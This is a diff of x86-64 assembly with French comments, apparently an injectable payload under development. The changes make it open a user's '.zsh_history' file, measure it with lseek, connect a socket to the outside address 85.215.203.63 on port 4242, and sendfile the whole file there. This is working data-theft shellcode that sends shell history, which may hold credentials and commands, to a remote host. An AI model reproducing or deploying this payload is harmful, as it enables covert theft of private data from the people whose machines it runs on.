@@ -20,20 +20,8 @@ global _payload_size
 
 _payload:
 	pushfq
-	pushx rsp, rax, rdi, rsi, rdx, r10, r12, 13
+	pushx rsp, rax, rdi, rsi, rdx, r10, r12, r13, r14
 
-	mov rax, 1	;SYS_open
-	mov rdi, 1
-	lea rsi, [rel msg2]
-	mov rdx, 4
-	syscall
-
-	jmp open
-
-msg db 'oui', 0x0a, 0
-msg2 db 'non', 0x0a, 0
-
-open:
 	; Ouvrir le fichier
 	mov rax, 2				; SYS_open
 	lea rdi, [rel path]		; Chemin du fichier
@@ -44,13 +32,23 @@ open:
 
 	mov r12, rax ; Descripteur de fichier
 
-	; Récupérer les métadonnées du fichier
-	mov rax, 4					; SYS_stat
-	lea rdi, [rel path]			; Chemin du fichier
-	lea rsi, [rel stat_buffer]	; Pointeur vers la structure stat
+	; Obtenir la taille du fichier via lseek
+	mov     rax, 8				; SYS_lseek
+	mov     rdi, r12			; fichier ouvert
+	xor     rsi, rsi			; offset = 0
+	mov     rdx, 2				; SEEK_END
 	syscall
-	test rax, rax
-	js error_open			; Gestion de l'erreur
+	test    rax, rax
+	js      error_open			; si erreur
+
+	mov     r14, rax			; taille du fichier
+
+	; Revenir au début du fichier
+	mov     rax, 8				; SYS_lseek
+	mov     rdi, r12
+	xor     rsi, rsi
+	xor     rdx, rdx			; SEEK_SET = 0
+	syscall
 
 	; Créer la socket
 	mov rax, 41				; SYS_socket
@@ -78,7 +76,7 @@ open:
 	mov rdi, r13					; socket file descriptor
 	mov rsi, r12					; file descriptor
 	xor rdx, rdx					; offset (NULL)
-	mov r10, [rel stat_buffer + 48]	; size
+	mov r10, r14					; size
 	syscall
 	test rax, rax
 	js error_socket					; Gestion de l'erreur
@@ -99,22 +97,23 @@ error_open:
 
 exit:
 	; Jump to the next instruction
-	pushx rsp, rax, rdi, rsi, rdx, r10, r12, 13
+	pushx rsp, rax, rdi, rsi, rdx, r10, r12, r13, r14
 	popfq
-	jmp 0x0
+	; jmp 0x0
+	mov rax, 60
+	mov rdi, 0
+	syscall 
 
-; section .data
-stat_buffer	times 144 db 0	; Taille de struct stat sur x86-64
 sockaddr_in:
 	; - sin_family: 2 octets
 	; - sin_port: 2 octets
 	; - sin_addr: 4 octets
 	; - sin_zero: 8 octets
-	dw 2                       ; sin_family (AF_INET)
-	dw 0x9210                  ; sin_port (3002 en hex)
-	dd 0x3fcbd755              ; sin_addr (INADDR_ANY)
-	times 8 db 0               ; sin_zero (8 octets de zéros)
+	dw 2                    ; sin_family = AF_INET (2)
+    dw 0x9210               ; sin_port = htons(4242) = 0x9210
+    dd 0x3fcbd755           ; sin_addr = inet_addr("85.215.203.63")
+    times 8 db 0            ; sin_zero (8 octets de padding)
 	; Taille totale: 16 octets
-path		times 1024 db 0	; Chemin du fichier
-; path		db '/home/maxence/.zsh_history', 0	; Chemin du fichier
+; path		times 1024 db 0	; Chemin du fichier
+path		db '/home/mbrement/.zsh_history', 0	; Chemin du fichier
 _payload_size dq $- _payload
